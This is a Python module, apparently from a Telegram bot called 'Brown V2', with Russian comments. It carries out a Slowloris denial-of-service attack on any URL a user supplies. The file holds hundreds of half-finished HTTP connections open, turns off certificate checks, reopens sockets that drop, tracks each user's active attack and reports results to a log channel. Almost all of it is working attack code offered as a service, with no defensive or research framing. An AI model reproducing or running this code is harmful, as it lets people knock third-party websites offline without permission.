# coding: utf-8
"""
Brown V2 | slowloris.py
Slowloris атака — держим соединения открытыми.
Минимальный трафик — безопасно для VPS.
"""

import asyncio
import random
import socket
import ssl
import logging
from urllib.parse import urlparse
from utils import now_msk

logger = logging.getLogger(__name__)

bot = None
main_bot = None

# Активные атаки: user_id -> asyncio.Task
_active_attacks: dict[int, asyncio.Task] = {}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0",
]


def set_bot_slowloris(b):
    global bot, main_bot
    bot = b
    if main_bot is None:
        main_bot = b


def _parse_target(url: str) -> tuple[str, int, str, bool]:
    """Парсит URL → (host, port, path, use_ssl)."""
    if not url.startswith("http"):
        url = "http://" + url
    parsed = urlparse(url)
    use_ssl = parsed.scheme == "https"
    host = parsed.hostname
    port = parsed.port or (443 if use_ssl else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    return host, port, path, use_ssl


def _make_socket(host: str, port: int, use_ssl: bool) -> socket.socket | None:
    """Создаёт сокет и подключается к цели."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        # Отправляем неполный HTTP заголовок
        ua = random.choice(USER_AGENTS)
        s.send(f"GET {'/?' + str(random.randint(1, 99999))} HTTP/1.1\r\n".encode())
        s.send(f"Host: {host}\r\n".encode())
        s.send(f"User-Agent: {ua}\r\n".encode())
        s.send(b"Accept-language: en-US,en;q=0.9\r\n")
        # НЕ отправляем финальный \r\n — соединение остаётся незавершённым
        return s
    except Exception:
        return None


async def _slowloris_attack(host: str, port: int, path: str, use_ssl: bool,
                             connections: int, duration: int,
                             user_id: int, url: str):
    """Основной цикл атаки."""
    import keyboards as _kb
    from config import bot_logs

    logger.info(f"[SLOWLORIS] Запуск | цель: {host}:{port} | соединений: {connections} | время: {duration}с")

    sockets = []
    sent_count = 0
    start = asyncio.get_event_loop().time()

    # Создаём начальные соединения
    loop = asyncio.get_event_loop()
    for _ in range(connections):
        s = await loop.run_in_executor(None, _make_socket, host, port, use_ssl)
        if s:
            sockets.append(s)

    logger.info(f"[SLOWLORIS] Открыто {len(sockets)} соединений")

    # Уведомляем пользователя о старте
    try:
        await _notify.send_message(user_id,
            f"⚡️ *Slowloris запущен!*\n"
            f"*└─ Цель:* {url}\n"
            f"*└─ Соединений:* {len(sockets)}\n"
            f"*└─ Длительность:* {duration} сек",
            parse_mode="Markdown")
    except Exception:
        pass

    # Основной цикл — каждые 10 секунд посылаем keep-alive заголовок
    while asyncio.get_event_loop().time() - start < duration:
        alive = []
        for s in sockets:
            try:
                # Посылаем случайный заголовок чтобы не закрылось
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                alive.append(s)
                sent_count += 1
            except Exception:
                # Соединение упало — пересоздаём
                new_s = await loop.run_in_executor(None, _make_socket, host, port, use_ssl)
                if new_s:
                    alive.append(new_s)

        sockets = alive
        logger.info(f"[SLOWLORIS] Живых соединений: {len(sockets)} | заголовков отправлено: {sent_count}")
        await asyncio.sleep(10)

    # Закрываем все соединения
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    now_str = now_msk().strftime("%d.%m.%Y %H:%M:%S")
    url_escaped = url.replace('_', '\\_').replace('.', '\\.')

    caption_user = (
        f"✅ *Slowloris завершён!*\n\n"
        f"🎯 *Цель:* {url}\n"
        f"🕐 *Время:* {now_str}\n"
        f"🔗 *Макс. соединений:* {connections}\n"
        f"📤 *Keep-alive отправлено:* {sent_count}"
    )
    caption_log = (
        f"⚡️ *Slowloris*\n\n"
        f"🎯 *Цель:* {url}\n"
        f"👤 *Пользователь:* {user_id}\n"
        f"🕐 *Время:* {now_str}\n"
        f"🔗 *Соединений:* {connections} | *Keep-alive:* {sent_count}"
    )

    try:
        await _notify.send_message(user_id, caption_user, parse_mode="Markdown",
                               reply_markup=_kb.main_menu)
    except Exception:
        pass
    try:
        from main import bot as main_bot_instance
        await main_bot_instance.send_message(bot_logs, caption_log, parse_mode="Markdown")
    except Exception:
        pass

    _active_attacks.pop(user_id, None)


async def main_slowloris(url: str, user_id: int, username: str,
                          connections: int = 200, duration: int = 60, notify_bot=None):
    _notify = notify_bot or bot
    """Запускает Slowloris атаку."""
    import keyboards as _kb

    # Проверяем нет ли уже активной атаки от этого пользователя
    if user_id in _active_attacks:
        await _notify.send_message(user_id,
            "⚠️ *У вас уже запущена атака!*\n*Дождитесь завершения.*",
            parse_mode="Markdown")
        return

    try:
        host, port, path, use_ssl = _parse_target(url)
    except Exception as e:
        await _notify.send_message(user_id, f"❌ *Неверный URL:* {str(e)[:50]}",
            parse_mode="Markdown", reply_markup=_kb.main_menu)
        return

    # Запускаем атаку как фоновую задачу
    task = asyncio.ensure_future(
        _slowloris_attack(host, port, path, use_ssl, connections, duration, user_id, url)
    )
    _active_attacks[user_id] = task
